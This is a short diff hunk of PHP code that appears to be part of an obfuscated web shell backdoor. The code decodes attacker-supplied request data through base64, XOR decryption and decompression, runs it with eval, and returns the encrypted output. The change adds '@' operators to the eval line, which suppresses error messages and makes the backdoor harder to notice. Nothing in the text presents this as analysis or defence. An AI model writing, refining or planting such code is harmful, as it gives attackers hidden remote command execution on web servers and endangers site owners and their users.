@@ -55,7 +55,7 @@ if($rr&&$ra){
 			if($e){
 				$k=$kh.$kf;
 				ob_start();
-				eval(gzuncompress(x(base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
+				@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
 				$o=ob_get_contents();
 				ob_end_clean();
 				$d=base64_encode(x(gzcompress($o),$k));
